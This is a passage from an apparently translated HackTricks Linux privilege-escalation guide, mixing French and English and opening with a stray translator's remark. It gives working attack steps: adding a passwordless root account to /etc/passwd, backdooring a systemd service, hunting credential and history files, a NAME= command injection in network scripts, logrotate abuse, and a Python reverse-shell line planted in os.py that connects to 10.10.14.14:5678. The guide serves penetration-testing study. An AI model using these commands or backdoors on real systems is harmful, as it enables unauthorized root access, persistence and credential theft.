- que j'intègre une ligne dans la traduction du README avec ces instructions, ou
- uniquement la traduction du fichier (collez-le ici).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Ex : `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Vous pouvez maintenant utiliser la commande `su` avec `hacker:hacker`

Alternativement, vous pouvez utiliser les lignes suivantes pour ajouter un utilisateur factice sans mot de passe.\
ATTENTION : cela peut réduire la sécurité actuelle de la machine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
REMARQUE : Sur les plateformes BSD `/etc/passwd` se trouve à `/etc/pwd.db` et `/etc/master.passwd`, de plus `/etc/shadow` est renommé en `/etc/spwd.db`.

Vous devriez vérifier si vous pouvez **écrire dans certains fichiers sensibles**. Par exemple, pouvez-vous écrire dans un **fichier de configuration de service** ?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Par exemple, si la machine exécute un serveur **tomcat** et que vous pouvez **modifier le fichier de configuration du service Tomcat dans /etc/systemd/,** alors vous pouvez modifier les lignes :
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Votre backdoor sera exécutée la prochaine fois que tomcat sera démarré.

### Vérifier les dossiers

Les dossiers suivants peuvent contenir des sauvegardes ou des informations intéressantes : **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Vous ne pourrez probablement pas lire le dernier, mais essayez)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Emplacement étrange / fichiers Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Fichiers modifiés dans les dernières minutes
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Fichiers Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Fichiers cachés
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries dans le PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Fichiers Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Sauvegardes**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Fichiers connus contenant des mots de passe

Lisez le code de [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), il recherche **plusieurs fichiers susceptibles de contenir des mots de passe**.\
**Un autre outil intéressant** que vous pouvez utiliser est : [**LaZagne**](https://github.com/AlessandroZ/LaZagne) qui est une application open source utilisée pour récupérer de nombreux mots de passe stockés sur un ordinateur local pour Windows, Linux & Mac.

### Journaux

Si vous pouvez lire les journaux, vous pourriez trouver **des informations intéressantes/confidentielles à l'intérieur**. Plus un journal est étrange, plus il sera intéressant (probablement).\
De plus, certains **journaux d'audit** **mal** configurés (backdoored ?) peuvent vous permettre d'**enregistrer des mots de passe** dans les journaux d'audit, comme expliqué dans cet article : [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Pour **lire les logs le groupe** [**adm**](interesting-groups-linux-pe/index.html#adm-group) sera vraiment utile.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Vous devriez également vérifier les fichiers contenant le mot "**password**" dans leur **nom** ou dans leur **contenu**, et aussi rechercher des IPs et des emails dans les logs, ou des hashes via des regexps.\
Je ne vais pas détailler ici comment faire tout cela, mais si cela vous intéresse vous pouvez consulter les dernières vérifications que [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) effectue.

## Fichiers accessibles en écriture

### Python library hijacking

Si vous savez **d'où** un script python va être exécuté et que vous **pouvez écrire dans** ce dossier ou que vous pouvez **modifier des librairies python**, vous pouvez modifier la bibliothèque OS et y installer une backdoor (si vous pouvez écrire là où le script python sera exécuté, copiez-collez la librairie os.py).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Une vulnérabilité dans `logrotate` permet à des utilisateurs disposant des **permissions d'écriture** sur un fichier de log ou ses répertoires parents d'obtenir potentiellement des privilèges élevés. En effet, `logrotate`, souvent exécuté en tant que **root**, peut être manipulé pour exécuter des fichiers arbitraires, notamment dans des répertoires comme _**/etc/bash_completion.d/**_. Il est important de vérifier les permissions non seulement dans _/var/log_ mais aussi dans tout répertoire où la rotation des logs est appliquée.

> [!TIP]
> Cette vulnérabilité affecte `logrotate` version `3.18.0` et antérieures

Plus d'informations détaillées sur la vulnérabilité sont disponibles sur cette page : [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Vous pouvez exploiter cette vulnérabilité avec [**logrotten**](https://github.com/whotwagner/logrotten).

Cette vulnérabilité est très similaire à [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** donc chaque fois que vous constatez que vous pouvez altérer des logs, vérifiez qui gère ces logs et si vous pouvez escalader les privilèges en remplaçant les logs par des symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Si, pour une raison quelconque, un utilisateur est capable d'**écrire** un script `ifcf-<whatever>` dans _/etc/sysconfig/network-scripts_ **ou** peut **modifier** un script existant, alors votre **système est pwned**.

Network scripts, _ifcg-eth0_ par exemple, sont utilisés pour les connexions réseau. Ils ressemblent exactement à des fichiers .INI. Cependant, ils sont ~sourced~ sur Linux par Network Manager (dispatcher.d).

Dans mon cas, l'attribut `NAME=` dans ces network scripts n'est pas géré correctement. Si vous avez un **espace blanc dans le nom le système essaie d'exécuter la partie après l'espace blanc**. Cela signifie que **tout ce qui suit le premier espace est exécuté en root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Remarque: l'espace vide entre Network et /bin/id_)

### **init, init.d, systemd, and rc.d**

Le répertoire `/etc/init.d` contient des **scripts** pour System V init (SysVinit), le **système classique de gestion de services Linux**. Il inclut des scripts pour `start`, `stop`, `restart`, et parfois `reload` des services. Ceux-ci peuvent être exécutés directement ou via des liens symboliques trouvés dans `/etc/rc?.d/`. Un chemin alternatif sur les systèmes Redhat est `/etc/rc.d/init.d`.

En revanche, `/etc/init` est associé à **Upstart**, un système plus récent de **gestion des services** introduit par Ubuntu, utilisant des fichiers de configuration pour les tâches de gestion des services. Malgré la transition vers Upstart, les scripts SysVinit sont encore utilisés aux côtés des configurations Upstart grâce à une couche de compatibilité dans Upstart.

**systemd** apparaît comme un gestionnaire d'initialisation et de services moderne, offrant des fonctionnalités avancées telles que le démarrage à la demande des daemons, la gestion des automounts, et les snapshots d'état du système. Il organise les fichiers dans `/usr/lib/systemd/` pour les paquets de distribution et `/etc/systemd/system/` pour les modifications de l'administrateur, simplifiant le processus d'administration système.

## Other Tricks

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Les frameworks de rooting Android hookent couramment un syscall pour exposer des fonctionnalités privilégiées du kernel à un manager userspace. Une authentification faible du manager (par ex., des vérifications de signature basées sur l'ordre des FD ou des schémas de mot de passe faibles) peut permettre à une application locale d'usurper le manager et d'escalader en root sur des appareils déjà rootés. En savoir plus et détails d'exploitation ici :


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

La discovery de services basée sur des regex dans VMware Tools/Aria Operations peut extraire un chemin binaire depuis les lignes de commande des processus et l'exécuter avec -v dans un contexte privilégié. Des patterns permissifs (par ex., utilisant \S) peuvent matcher des listeners placés par un attaquant dans des emplacements inscriptibles (par ex., /tmp/httpd), conduisant à une exécution en tant que root (CWE-426 Untrusted Search Path).

En savoir plus et voir un pattern généralisé applicable à d'autres stacks de discovery/monitoring ici :

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## References

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
